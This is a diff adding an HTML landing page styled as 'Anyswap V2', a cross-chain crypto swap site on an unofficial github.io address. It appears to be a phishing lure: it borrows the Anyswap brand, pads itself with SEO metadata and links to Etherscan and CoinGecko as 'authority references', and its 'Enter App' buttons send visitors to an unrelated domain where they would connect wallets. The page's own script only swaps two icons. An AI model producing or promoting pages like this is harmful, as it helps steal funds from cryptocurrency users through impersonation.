@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Anyswap - Dashboard</title>
+  <meta name="description" content="Anyswap V2 is a cross-chain swap interface for moving tokens between blockchains from your own wallet.">
+  <link rel="canonical" href="https://anyswap-v2.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F6F4F1">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Anyswap V2">
+  <meta property="og:description" content="Anyswap V2 is a cross-chain swap interface for moving tokens between blockchains from your own wallet.">
+  <meta property="og:url" content="https://anyswap-v2.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Anyswap V2">
+  <meta name="twitter:description" content="Anyswap V2 is a cross-chain swap interface for moving tokens between blockchains from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://anyswap-v2.github.io/#website",
+        "url": "https://anyswap-v2.github.io/",
+        "name": "Anyswap V2",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://anyswap-v2.github.io/#app",
+        "name": "Anyswap V2",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://anyswap-v2.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://anyswap-v2.github.io/#organization",
+        "name": "Anyswap V2",
+        "url": "https://anyswap-v2.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand" aria-label="Anyswap V2">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Anyswap</span>
+    </div>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Bridges</a>
+      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+    </nav>
+    <span class="spacer" aria-hidden="true"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Anyswap</h1>
+      <p class="value"><strong>Anyswap</strong> is a cross-chain swap interface for moving tokens between blockchains from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="Cross-chain swap route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="asset">
+            <img src="eth.png" width="30" height="30" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+
+        <button class="switch" type="button" data-switch aria-label="Switch route direction">
+          <span aria-hidden="true">→</span>
+        </button>
+
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="asset">
+            <img src="usdc.png" width="30" height="30" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+      </div>
+
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="footer">Anyswap — 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var assets = document.querySelectorAll(".asset");
+      if (assets.length < 2) return;
+
+      var first = assets[0].innerHTML;
+      assets[0].innerHTML = assets[1].innerHTML;
+      assets[1].innerHTML = first;
+      button.classList.toggle("is-swapped");
+    });
+  })();
+  </script>
+</body>
+</html>
